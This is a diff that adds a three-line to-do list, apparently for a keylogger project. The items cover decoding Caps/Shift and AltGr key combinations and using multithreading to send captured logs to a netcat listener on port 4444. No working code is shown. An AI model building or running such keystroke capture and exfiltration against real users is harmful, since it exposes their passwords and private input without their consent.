@@ -1,0 +1,3 @@
+- Find a way to interpret MAJ with CAPS or SHIFT
+- Find a way to interpret alt gr + KEY or shift + key
+- Multithreading to send logs to nc -lnvp 4444 > logs.txt
